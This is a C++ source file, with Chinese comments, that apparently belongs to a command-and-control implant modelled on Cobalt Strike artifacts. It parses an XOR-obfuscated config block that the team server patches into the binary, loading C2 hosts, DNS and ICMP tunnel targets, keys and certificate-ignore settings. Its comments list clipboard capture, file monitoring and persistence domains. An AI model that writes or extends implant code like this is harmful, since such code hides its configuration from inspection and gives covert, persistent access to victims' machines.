/**
 * @file EmbeddedConfig.cpp
 * @brief 模板化配置块（CS 式 artifact）Agent 侧实现
 * @details
 * 布局（与 TeamServer/服务端实现 锁步，两处注释互指）：
 *   [0..15]   魔数 kCfgMagic（伪随机，非字符串）
 *   [16]      版本 kCfgVersion
 *   [17]      状态（0=模板空，1=已配置）
 *   [18..]    XOR(0x5A) 后的 JSON（≤4094 字节，超限服务器侧报错）
 *   其余      0x00 填充（固定 4096B，替换不改文件长度）
 *
 * 模板状态下只有魔数+版本+空状态 → Apply 返回 false，走 CLI/编译期默认。
 */

#include "EmbeddedConfig.hpp"

#include "Core/Config/AgentConfig.hpp"
#include "Core/Config/JsonField.hpp"
#include "Crypto/Engine/CryptoManager.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"
#include "Common/ThirdParty/json.hpp"

#include <cstring>
#include <string>
#include <thread>
#include <vector>

namespace cleat {

    /**
     * @brief 配置块数据（普通 const 数组，位于 .rdata 段）
     * @details
     * 无自定义节，无 PE 结构改动。服务器按魔数在文件中搜索定位并整体替换；
     * 模板状态下仅包含魔数、版本和空状态，其余字节为 0x00 填充。
     */
    const uint8_t g_cfg_blob[kCfgBlobSize] = {
        kCfgMagic[0],  kCfgMagic[1],  kCfgMagic[2],  kCfgMagic[3],
        kCfgMagic[4],  kCfgMagic[5],  kCfgMagic[6],  kCfgMagic[7],
        kCfgMagic[8],  kCfgMagic[9],  kCfgMagic[10], kCfgMagic[11],
        kCfgMagic[12], kCfgMagic[13], kCfgMagic[14], kCfgMagic[15],
        kCfgVersion,   kCfgStateEmpty,
        // 其余 0x00 填充（模板空配置）
    };

    /**
     * @brief 应用嵌入配置（在参数解析前调用）
     * @details
     * 检查配置块状态，若为已配置则解密载荷并解析 JSON，
     * 将连接参数、可调字段及密钥写入 AgentConfig 和 CryptoManager。
     *
     * @note 使用 volatile 读取以防止编译优化将 const 数组值常量折叠为模板态。
     * @retval true  成功应用嵌入配置
     * @retval false 未命中或应用失败，将回退到 CLI 参数或编译期默认值
     */
    bool EmbeddedConfigApply() {
        // 状态校验：必须强制读内存，避免 /O2 常量折叠导致 patch 后的值读不到
        const volatile uint8_t* blob = g_cfg_blob;
        if (blob[16] != kCfgVersion || blob[17] != kCfgStateSet) {
            return false;   // 模板空态或版本不符：走 CLI/编译期默认
        }

        // 解密载荷（XOR；仅防 strings 直接读取，非强加密 ——
        // 强保护见 ROADMAP 二期 Ed25519 签名）。
        // [18..19] 为载荷长度（大端 uint16，patch 时写入，明文元数据），
        // 按长度截断，否则 XOR 后的 0x00 填充（0x5A='Z'）会混入 JSON 解析报错。
        const size_t payLen = (static_cast<size_t>(blob[18]) << 8) | blob[19];
        if (payLen == 0 || payLen > static_cast<unsigned long long>(kCfgBlobSize) - 20) {
            CLEAT_LOGE(ErrDom::Cfg, ErrCode::InvalidParam, "EmbeddedConfig: 载荷长度非法: " << payLen);
            return false;
        }
        std::vector<uint8_t> buf;
        buf.reserve(payLen);
        for (size_t i = 0; i < payLen; ++i) {
            buf.push_back(static_cast<uint8_t>(blob[20 + i]));
        }
        for (auto& b : buf) {
            b ^= kCfgXorKey;
        }

        nlohmann::json cfg;
        try {
            cfg = nlohmann::json::parse(buf.data(), buf.data() + buf.size());
        }
        catch (const std::exception& e) {
            CLEAT_LOGE(ErrDom::Cfg, ErrCode::InvalidParam, "EmbeddedConfig: 载荷解析失败: " << e.what());
            return false;
        }
        if (!cfg.is_object()) {
            CLEAT_LOGE(ErrDom::Cfg, ErrCode::InvalidParam, "EmbeddedConfig: 载荷非 JSON 对象");
            return false;
        }

        AgentConfig& ac = AgentConfig::Instance();

        // ---- 连接字段（启动早期单线程写，无锁安全） ----
        if (cfg.contains("transport") && cfg["transport"].is_string()) {
            ac.transport_mode = cfg["transport"].get<std::string>();
        }
        if (cfg.contains("host") && cfg["host"].is_string()) {
            ac.server_host = cfg["host"].get<std::string>();
        }
        // /同族(第十七轮): 旧写法 is_number() 对 float 亦为真 → get<uint64_t>()
        // 的越界 double→整型转换是 UB, 且 static_cast<uint16_t> 前无范围检查
        //(70000 会被静默回绕成错误端口)。统一走 JsonField 的整型读取 + 范围校验;
        // 无 port 或非法时保持默认值, 与旧行为一致。
        detail::ReadUInt(cfg, "port", ac.server_port, 0, 65535);
        if (cfg.contains("url") && cfg["url"].is_string()) {
            ac.https_url = cfg["url"].get<std::string>();
        }
        if (cfg.contains("upload_url") && cfg["upload_url"].is_string()) {
            ac.https_upload_url = cfg["upload_url"].get<std::string>();
        }
        if (cfg.contains("dns_server") && cfg["dns_server"].is_string()) {
            ac.dns_server = cfg["dns_server"].get<std::string>();
        }
        if (cfg.contains("dns_domain") && cfg["dns_domain"].is_string()) {
            ac.dns_domain = cfg["dns_domain"].get<std::string>();
        }
        if (cfg.contains("icmp_target") && cfg["icmp_target"].is_string()) {
            ac.icmp_target = cfg["icmp_target"].get<std::string>();
        }
        // 兼容旧顶层 user_agent: 启动期一次性写入 http_user_agent 字段。
       // 新格式请用 http.user_agent(走 ApplyJson); 两者同时存在时, 后者会覆盖前者。
        if (cfg.contains("user_agent") && cfg["user_agent"].is_string()) {
            ac.http_user_agent = cfg["user_agent"].get<std::string>();
        }
        // ---- 可调字段：直接透传 JSON 给 ApplyJson ----
        // ApplyJson 只认 ConfigContract.hpp 声明的 14 个子域:
        //   heartbeat / reconnect / transport_failover / recovery / channels /
        //   channel_limit / service_defaults / capture / clipboard / file_monitor /
        //   lifecycle / runtime / http / persist
        //
        // runtime/http/persist 是  散键归位后的新域:
        //   原 first_connect_delay_max_ms / worker_timeout_ms / log_level /
        //   crash_dump_enabled        → runtime.*
        //   原 http_user_agent / https_ignore_cert / https_proxy → http.*
        //   原 persist_value_name / persist_task_name / persist_author → persist.*
        //
        // **旧顶层散键已不再识别**, 下发后会被静默忽略(按既有约定"不认识的键
        // 忽略, 不影响已有配置")。TeamServer 侧 artifact 生成器须同步改为新域
        // 格式(见 patch.go 的配置模板), 否则嵌入式配置里的这些字段会静默失效。
        //
        // 本文件上方手动处理的连接字段(transport / host / port / url /
        // upload_url / dns_server / dns_domain / icmp_target / user_agent)
        // 是启动引导层参数, 不进 ApplyJson, 属 _startup 只读区, 运行期不可改。
        ac.ApplyJson(cfg);

        // ---- 密钥：嵌入值为默认，CLI --psk/--server-pubkey 在其后解析会覆盖 ----
        if (cfg.contains("psk") && cfg["psk"].is_string()) {
            CryptoManager::Instance().SetPsk(cfg["psk"].get<std::string>());
        }
        if (cfg.contains("server_pubkey") && cfg["server_pubkey"].is_string()) {
            CryptoManager::Instance().SetServerPublicKey(cfg["server_pubkey"].get<std::string>());
        }

        LOG_INFO("EmbeddedConfig: 已应用模板配置 transport=" << ac.transport_mode
            << " host=" << ac.server_host << ":" << ac.server_port);
        return true;
    }

} // namespace cleat